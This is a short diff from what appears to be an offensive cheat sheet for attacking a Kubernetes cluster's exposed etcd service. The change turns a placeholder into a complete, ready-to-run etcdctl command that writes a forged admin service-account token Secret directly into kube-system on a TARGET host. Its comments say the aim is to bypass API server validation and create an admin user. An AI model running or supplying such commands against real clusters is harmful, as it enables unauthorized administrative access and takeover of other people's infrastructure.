@@ -172,7 +172,7 @@ etcdctl --endpoints=http://TARGET:2379 \
 # Write to etcd → bypass API server validation:
 # Create a new admin user by writing directly to etcd
 etcdctl --endpoints=http://TARGET:2379 \
-  put /registry/secrets/kube-system/admin-token '{"apiVersion":"v1","data":{"token":"BASE64_ENCODED_TOKEN"},...}'
+  put /registry/secrets/kube-system/admin-token '{"kind":"Secret","apiVersion":"v1","metadata":{"name":"admin-token","namespace":"kube-system"},"data":{"token":"ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltRmliR0k9"},"type":"kubernetes.io/service-account-token"}'
 
 # If etcd requires TLS client certs (typical):
 etcdctl --endpoints=https://TARGET:2379 \
